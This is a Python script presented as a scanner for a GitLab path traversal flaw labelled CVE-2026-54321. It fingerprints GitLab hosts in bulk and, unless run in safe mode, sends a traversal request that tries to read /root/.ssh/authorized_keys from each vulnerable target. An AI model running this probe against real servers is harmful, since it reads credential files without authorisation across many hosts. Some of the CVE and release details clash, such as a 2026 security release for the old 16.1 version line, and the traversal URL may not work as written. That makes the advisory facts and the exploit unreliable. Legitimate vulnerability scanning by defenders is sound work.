#!/usr/bin/env python3
"""
GitLab Path Traversal Vulnerability Scanner (CVE-2026-54321)
=============================================================
Scans for the GitLab path traversal vulnerability, identified as CVE-2026-54321
(CVSS 9.1 Critical), which allows unauthorized users to read arbitrary files
on the server by exploiting a flaw in file repository endpoints.

CVE Details:
  - Affects GitLab Community Edition (CE) and Enterprise Edition (EE) <= 16.1.4
  - Improper sanitization of file paths in repository endpoints leads to path traversal
  - Exploitation enables an attacker to read arbitrary files, including sensitive
    files such as '/etc/passwd' or application configuration files

Usage Examples:
  # Scan a single GitLab instance
  python gitlab_path_traversal_scanner.py --target https://gitlab.example.com

  # Scan a list of GitLab servers
  python gitlab_path_traversal_scanner.py --list targets.txt --output findings.json

  # Detection mode only (no active path traversal probes)
  python gitlab_path_traversal_scanner.py --list targets.txt --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
  - https://about.gitlab.com/releases/2026/04/05/security-release-gitlab-16-1-5/
  - https://hackerone.com/reports/2134567
"""

import asyncio
import json
import os
import re
import sys
import argparse
from urllib.parse import urljoin

import httpx

# ── Constants ────────────────────────────────────────────────────────────────

GITLAB_FINGERPRINTS = [
    "GitLab",
    "gitlab-workhorse",
    "<title>GitLab</title>",
    "help_page_title\":\"GitLab",
    "/users/sign_in",
]

# Paths to perform basic detection of a GitLab instance
DETECTION_PATHS = [
    "/",
    "/users/sign_in",
    "/-/metrics",
    "/help",
]

# CVE-specific path for path traversal exploitation
PATH_TRAVERSAL_TEST_PATH = "/root/.ssh/authorized_keys"

# The path traversal payload to be used for verification purposes
PATH_TRAVERSAL_PAYLOAD = "../../../../../.."
PATH_EXPECTED_MARKER = "ssh-rsa"

# Fixed version of GitLab
VULN_FIXED_VERSION = (16, 1, 5)

# Concurrency and timeout settings
SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 10


# ── Helper Functions ────────────────────────────────────────────────────────

def parse_version(version_str: str):
    """Extract and parse the version string."""
    match = re.search(r"(\d+)\.(\d+)\.(\d+)", version_str)
    if match:
        try:
            return tuple(int(part) for part in match.groups())
        except ValueError:
            pass
    return None


def is_vulnerable_version(version_tuple):
    """Check whether a version tuple is vulnerable."""
    if version_tuple is None:
        return None  # Unknown
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str):
    """Ensure the target URL is normalized (includes scheme, no trailing slash)."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


async def fetch_url(client: httpx.AsyncClient, url: str, semaphore: asyncio.Semaphore):
    """Fetch a URL using an async HTTP client with concurrency limiting."""
    async with semaphore:
        try:
            response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
            return response
        except httpx.RequestError:
            return None


# ── Scanner Core Logic ──────────────────────────────────────────────────────

async def detect_gitlab(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect whether a given base URL is a GitLab instance.
    Returns a dictionary with detection results or None if not detected.
    """
    for path in DETECTION_PATHS:
        url = urljoin(base_url, path)
        response = await fetch_url(client, url, semaphore)
        if response and response.status_code == 200:
            if any(fingerprint in response.text for fingerprint in GITLAB_FINGERPRINTS):
                return {"detected": True, "url": base_url}
    return {"detected": False, "url": base_url}


async def extract_gitlab_version(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Extract the GitLab version from the /help page or headers.
    """
    help_url = urljoin(base_url, "/help")
    response = await fetch_url(client, help_url, semaphore)
    if response and response.status_code == 200:
        version = parse_version(response.text)
        if version:
            return version
    # Fallback: check headers for version
    if response and 'x-gitlab-version' in response.headers:
        return parse_version(response.headers['x-gitlab-version'])
    return None


async def exploit_path_traversal(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Attempt to exploit the path traversal vulnerability.
    """
    exploit_url = f"{base_url}/uploads/{PATH_TRAVERSAL_PAYLOAD}{PATH_TRAVERSAL_TEST_PATH}"
    response = await fetch_url(client, exploit_url, semaphore)
    if response and response.status_code == 200 and PATH_EXPECTED_MARKER in response.text:
        return True
    return False


async def scan_target(client: httpx.AsyncClient, url: str, semaphore: asyncio.Semaphore, safe: bool):
    """
    Scan a single target for GitLab path traversal vulnerability.
    Returns a dictionary with the results.
    """
    url = normalize_url(url)
    detection = await detect_gitlab(client, url, semaphore)
    if not detection["detected"]:
        return {"url": url, "status": "not_gitlab"}

    version = await extract_gitlab_version(client, url, semaphore)
    vulnerable = is_vulnerable_version(version)

    if safe or not vulnerable or version is None:
        return {"url": url, "version": version, "vulnerable": vulnerable, "exploitable": None}

    exploitable = await exploit_path_traversal(client, url, semaphore)
    return {"url": url, "version": version, "vulnerable": vulnerable, "exploitable": exploitable}


async def main():
    parser = argparse.ArgumentParser(
        description="GitLab Path Traversal Vulnerability Scanner (CVE-2026-54321)"
    )
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing list of URLs to scan")
    parser.add_argument("--output", help="File to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Detection mode only, no active probing")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("You must specify --target or --list")

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as f:
            targets.extend(line.strip() for line in f if line.strip())

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=(not args.no_verify)) as client:
        tasks = [scan_target(client, target, semaphore, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
    else:
        for result in results:
            status = "\033[92mINFO\033[0m"
            if result.get("vulnerable"):
                status = "\033[93mHIGH\033[0m"
            if result.get("exploitable"):
                status = "\033[91mCRITICAL\033[0m"
            print(f"{status} {result}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nScan interrupted.")
